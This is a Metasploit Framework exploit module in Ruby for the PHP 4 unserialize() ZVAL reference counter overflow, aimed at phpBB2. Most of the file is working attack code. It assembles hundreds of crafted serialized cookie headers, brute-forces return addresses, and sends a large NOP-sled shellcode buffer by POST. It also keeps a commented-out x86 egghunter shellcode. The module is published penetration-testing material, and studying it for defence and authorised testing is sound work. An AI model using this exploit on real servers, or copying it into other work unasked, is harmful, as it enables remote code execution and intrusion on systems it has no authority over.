##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Multi::Php::PHP_Unserialize_Zval_phpBB2 < 
Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::HttpClient
	include Exploit::Brute
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'PHP 4 unserialize() ZVAL 
Reference Counter Overflow (phpBB2)',
			'Description'    => %q{
				This module exploits an integer overflow 
vulnerability in the unserialize()
			function of the PHP web server extension. This 
vulnerability was patched by
			Stefan in version 4.5.0 and applies all previous 
versions supporting this function.
			This particular module targets the phpBB2 web 
application and is based on the proof
			of concept provided by Stefan Esser. This 
vulnerability requires approximately 900k
			of data to trigger on phpBB2 (due the multiple 
Cookie headers requirement). Since we
			are already assuming a fast network connection, 
we use a 2Mb block of shellcode for
			the brute force, allowing quick exploitation for 
those with fast networks. 
			
			One of the neat things about this vulnerability 
is that on x86 systems, the EDI register points
			into the beginning of the hashtable string. This 
can be used with an egghunter to
			quickly exploit systems where the location of a 
valid "jmp EDI" or "call EDI" instruction
			is known. The EDI method is faster, but the 
bandwidth-intensive brute force used by this
			module is more reliable across a wider range of 
systems.
			
			
			},
			'Author'         => 
				[ 
					'hdm',                                        
# module development
					'GML <grandmasterlogic [at] 
gmail.com>',      # module development and debugging
					'Stefan Esser <sesser [at] 
hardened-php.net>' # discovered, patched, exploited
				], 
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 3509 $',
			'References'     =>
				[
					['URL', 
'http://www.php-security.org/MOPB/MOPB-04-2007.html'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'       => 1024,
				},
			'Targets'        => 
				[
				
					#
					# 64-bit SuSE:    0x005c0000
					# Backtrack 2.0:  0xb797a000
					# Gentoo:         0xb6900000
					#
					
					[ 'Linux x86 phpBB2', 
						{
							'Platform' => 
'linux', 
							'Arch'     => [ 
ARCH_X86 ],
							'Bruteforce' => 
								{
									
'Start' => { 'Ret' => 0xb6000400 },
									
'Stop'  => { 'Ret' => 0xbfff0000 },
									
'Step'  => 1024*1024
								}							
						}
					]
				],
			'DisclosureDate' => 'Mar 04 2007'))
			
			register_options(
				[
					OptString.new('URI', [true, "The 
full URI path to vulnerable PHP script", '/phpBB2/faq.php']),
					OptString.new('COOKIENAME', 
[true, "The prefix to use in front of cookie names", 'phpbb2mysql'])
				], self.class)
	end

	def brute_exploit(target_addrs)
	

		zvalref   = encode_semis('i:0;R:2;')

#
# Use this if we decide to do 'jmp edi' returns vs brute force
#
=begin
		# Linux specific egg-hunter
		tagger = "\x90\x50\x90\x50"
		hunter = 
			
"\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80" +
			"\x3c\xf2\x74\xf1\xb8" +
			tagger +
			"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7"

		egghunter = "\xcc" * 39
		egghunter[0, hunter.length] = hunter
		
		hashtable = "\xcc" * 39
		hashtable[0, 2] = "\xeb\xc6" # jmp back 32 bytes
		
		hashtable[20, 4] = [target_addrs['Ret']].pack('V')
		hashtable[32, 4] = [target_addrs['Ret']].pack('V')
=end

		#
		# Just brute-force addresses for now
		# 
		tagger    = ''
		egghunter = rand_text_alphanumeric(39)
		hashtable = rand_text_alphanumeric(39)
		hashtable[20, 4] = [target_addrs['Ret']].pack('V')
		hashtable[32, 4] = [target_addrs['Ret']].pack('V')

		# Generate and reuse the original buffer to save CPU
		if (not @saved_cookies)
		
			# Building the malicious request
			print_status("Creating the request...")
				
			# Create the first cookie header to get this 
started
			cookie_fun = "Cookie: 
#{datastore['COOKIENAME']}_data="
			cookie_fun << Rex::Text.uri_encode(
				
'a:100000:{s:8:"AAAABBBB";a:3:{s:12:"0123456789AA";a:1:{s:12:"AAAABBBBCCCC";i:0;}s:12:"012345678AAA";'+
				'i:0;s:12:"012345678BAN";i:0;}'
			)
			cookie_fun << zvalref * 500
			cookie_fun << Rex::Text.uri_encode('s:2:"')
			cookie_fun << "\r\n"

			refcnt = 1000
			refmax = 65535

			# Keep adding cookie headers...
			while(refcnt < refmax) 

				chead   = 'Cookie: ';
				chead  << encode_semis('";N;')

				# Stay within the 8192 byte limit
				0.upto(679) do |i|
					break if refcnt >= refmax
					refcnt += 1

					chead << zvalref
				end
				chead << encode_semis('s:2:"')
				cookie_fun << chead + "\r\n"
			end

			# The final header, including the hashtable with 
return address
			cookie_fun << "Cookie: "
			cookie_fun << Rex::Text.uri_encode('";N;')
			cookie_fun << zvalref * 500	
			
			@saved_cookies = cookie_fun
		end

		# Generate and reuse the payload to save CPU time
		if (not @saved_payload)
			@saved_payload = ((tagger + tagger + 
make_nops(8192) + payload.encoded) * 256)
		end
		
		cookie_addrs = Rex::Text.uri_encode(
			's:39:"' + egghunter + '";s:39:"'+ hashtable 
+'";i:0;R:3;'
		) + "\r\n"

		print_status("Trying address 0x%.8x..." % 
target_addrs['Ret'])
		res = send_request_cgi({
			'uri'		  => datastore['URI'],
			'method'	  => 'POST',
			'raw_headers' => @saved_cookies + cookie_addrs,
			'data'        => @saved_payload
		}, 1)

		
		if res
			print_status("Received a response: #{res.code} 
#{res.message}")
		else
			print_status("No response from the server")
		end

	end

	def encode_semis(str)
		str.gsub(';') { |s| sprintf("%%%.2x", s[0]) }
	end

end
end	
